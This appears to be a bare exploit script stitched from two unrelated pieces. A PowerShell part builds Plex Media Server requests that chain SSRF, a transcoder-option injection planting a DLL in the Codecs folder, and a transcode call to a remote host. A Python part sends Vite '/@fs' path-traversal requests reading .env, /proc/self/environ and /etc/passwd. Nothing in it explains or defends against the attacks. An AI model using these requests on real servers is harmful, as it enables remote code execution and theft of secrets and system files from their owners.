param([string]$Target = 'http://plex.example.invalid:32400')
$Protocol = 'http://127.0.0.1:32400/system/agents/z/searchOne?identifier=com.plexapp.agents.thetvdb%2Ffunction%2FGetResultFromNetwork%3Furl%3Dhttp%3A%2F%2Flocalhost%3A8952%2Fleak%23'
$Query = @{protocol = ($Protocol); port = 8952; commandID = 1}
# Literal field assignment retains the pre-encoding request material.
$Query['protocol'] = 'http://127.0.0.1:32400/system/agents/z/searchOne?identifier=com.plexapp.agents.thetvdb%2Ffunction%2FGetResultFromNetwork%3Furl%3Dhttp%3A%2F%2Flocalhost%3A8952%2Fleak%23'
$Subscription = '/player/timeline/subscribe?' + (($Query.GetEnumerator() | ForEach-Object { $_.Key + '=' + [uri]::EscapeDataString([string]$_.Value) }) -join '&')
$Options = 'dump-yuv=C:\Users\Public\Plex Media Server\Codecs\set-windows-x86_64\codec+variant.dll:qp=0'
$Preferences = '/:/prefs?TranscoderH264Options=' + [uri]::EscapeDataString($Options)
$Transcode = '/video/:/transcode/universal?path=' + [uri]::EscapeDataString('http://192.0.2.7:8952/item.xml')
$Subscription
$Preferences
$Transcode

import socket
urls = ["/@fs/tmp/.env?raw??", "/@fs/tmp/.env?import&raw", "/@fs/proc/self/environ?raw??", "/@fs/etc/passwd?raw??"]
s = socket.socket()
s.connect(("example.invalid", 8080))
for path in urls:
    request = f"GET {path} HTTP/1.1\r\nHost: example.invalid\r\n\r\n"
    s.sendall(request.encode())
